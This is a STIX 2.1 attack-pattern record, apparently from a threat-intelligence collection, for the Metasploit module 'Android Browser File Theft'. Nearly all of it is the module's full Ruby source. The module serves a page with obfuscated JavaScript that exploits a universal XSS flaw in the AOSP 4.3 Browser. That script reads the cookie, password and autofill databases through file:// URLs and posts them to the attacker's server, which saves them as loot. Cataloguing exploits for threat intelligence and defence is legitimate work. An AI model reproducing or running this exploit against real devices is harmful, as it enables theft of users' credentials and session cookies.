{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e700a4e3-b643-428f-b2fe-78eb2f0a472b",
    "created": "2024-08-14T16:31:31.352005Z",
    "modified": "2024-08-14T16:31:31.352009Z",
    "name": "Android Browser File Theft",
    "description": " This module steals the cookie, password, and autofill databases from the Browser application on AOSP 4.3 and below. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/android_browser_file_theft.rb",
            "external_id": "android_browser_file_theft.rb"
        },
        {
            "source_name": "reference",
            "url": "https://android.googlesource.com/platform/packages/apps/Browser/+/d2391b492dec778452238bc6d9d549d56d41c107%5E%21/#F0"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.chromium.org/p/chromium/issues/detail?id=90222#theUXSS"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::JSObfu\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'        => 'Android Browser File Theft',\n      'Description' => %q{\n        This module steals the cookie, password, and autofill databases from the\n        Browser application on AOSP 4.3 and below.\n      },\n      'Author'         => [\n        'Rafay Baloch', # Found UXSS bug in Android Browser\n        'joev'          # File redirect and msf module\n      ],\n      'License'     => MSF_LICENSE,\n      'Actions'        => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],\n      'PassiveActions' => [ 'WebServer' ],\n      'References' =>\n        [\n          # patch for file redirection, 2014\n          ['URL', 'https://android.googlesource.com/platform/packages/apps/Browser/+/d2391b492dec778452238bc6d9d549d56d41c107%5E%21/#F0'],\n          ['URL', 'https://bugs.chromium.org/p/chromium/issues/detail?id=90222'] # the UXSS\n        ],\n      'DefaultAction'  => 'WebServer'\n    ))\n\n     register_options([\n      OptString.new('ADDITIONAL_FILES', [\n        false,\n        'Comma-separated list of addition file URLs to steal.',\n      ]),\n      OptBool.new('DEFAULT_FILES', [\n        true,\n        'Steals a default set of file URLs',\n        true\n      ])\n    ])\n  end\n\n  def run\n    exploit\n  end\n\n  def on_request_uri(cli, request)\n    if request.method.downcase == 'post'\n      process_post(cli, request)\n      send_response_html(cli, '')\n    else\n      print_status('Sending exploit landing page...')\n      send_response_html(cli, exploit_html)\n    end\n  end\n\n  def process_post(cli, request)\n    data = JSON.parse(request.body)\n    contents = hex2bin(data['data'])\n    file = File.basename(data['url'])\n    print_good(\"File received: #{(contents.bytesize.to_f/1000).round(2)}kb #{file}\")\n    loot_path = store_loot(\n      file,\n      'application/x-sqlite3',\n      cli.peerhost,\n      contents,\n      File.basename(data['url']),\n      \"#{cli.peerhost.ljust(16)} Android browser file\"\n    )\n    print_good(\"Saved to: #{loot_path}\")\n  end\n\n\n  def file_urls\n    default_urls = [\n      'file:///data/data/com.android.browser/databases/webviewCookiesChromium.db',\n      'file:///data/data/com.android.browser/databases/webview.db',\n      'file:///data/data/com.android.browser/databases/autofill.db',\n      'file:///data/data/com.android.browser/databases/browser2.db',\n      'file:///data/data/com.android.browser/app_appcache/ApplicationCache.db',\n      'file:///data/data/com.android.browser/app_databases/Databases.db',\n      'file:///data/data/com.android.browser/databases/webviewCookiesChromiumPrivate.db'\n    ]\n\n    unless datastore['DEFAULT_FILES']\n      default_urls = []\n    end\n\n    default_urls + (datastore['ADDITIONAL_FILES']||'').split(',')\n  end\n\n  def exploit_html\n    %Q|\n      <!doctype html>\n      <html>\n      <body>\n      <script>#{exploit_js}</script>\n      </body>\n      </html>\n    |\n  end\n\n  def exploit_js\n    js_obfuscate %Q|\n      window.onmessage = function(e) {\n        var x = new XMLHttpRequest;\n        x.open(\"POST\", location.href);\n        x.send(JSON.stringify(e.data))\n      };\n\n\n      function xss() {\n        var urls = (#{JSON.generate(file_urls)});\n        function tick() {\n          setTimeout(function() { next(urls.shift()); });\n        };\n        window.onmessage = tick;\n\n        function next(url) {\n          if (!url) return;\n          try {\n            var f = document.createElement('iframe');\n            f.src = url;\n            f.onload = function() {\n              f.onload = null;\n              function nested() {\n                var x = new XMLHttpRequest;\n                x.open('GET', location.href);\n                x.responseType = 'arraybuffer';\n                x.send();\n                x.onload = function() {\n                  var buff = new Uint8Array(x.response);\n                  var hex = Array.prototype.map.call(buff, function(d) {\n                    var c = d.toString(16);\n                    return (c.length < 2) ? 0+c : c;\n                  }).join(new String);\n                  /*ensures there are no 'not allowed' responses that appear to be valid data*/\n                  if (hex.length && hex.indexOf('#{Rex::Text.to_hex(\"<html><body>not allowed</body></html>\",\"\")}') === -1) {\n                    top.postMessage({data:hex,url:location.href}, '*');\n                  }\n                  parent.postMessage(1,'*');\n                };\n                x.onerror = function() {\n                  parent.postMessage(1,'*');\n                };\n              }\n              document.documentURI = 'javascript://hostname.com/%0D%0A('+encodeURIComponent(nested.toString())+')()';\n              f.contentWindow.location = \"\";\n            };\n            document.body.appendChild(f);\n          } catch(e) {t();}\n        };\n\n        tick();\n\n      }\n\n      var brokenFrame = document.createElement('iframe');\n      brokenFrame.src = 'http://localhost:100';\n      brokenFrame.setAttribute('style', 'position:absolute;left:-1000px;height:0;width:0;visibility:hidden;')\n      brokenFrame.onload = function() {\n        brokenFrame.onload = null;\n        document.documentURI = 'javascript://hostname.com/%0D%0A('+encodeURIComponent(xss.toString())+')()';\n        brokenFrame.contentWindow.location = \"\";\n      };\n      document.body.appendChild(brokenFrame);\n    |\n  end\n\n  # TODO: Make this a proper Rex::Text function\n  def hex2bin(hex)\n    hex.chars.each_slice(2).map(&:join).map { |c| c.to_i(16) }.map(&:chr).join\n  end\nend\n"
}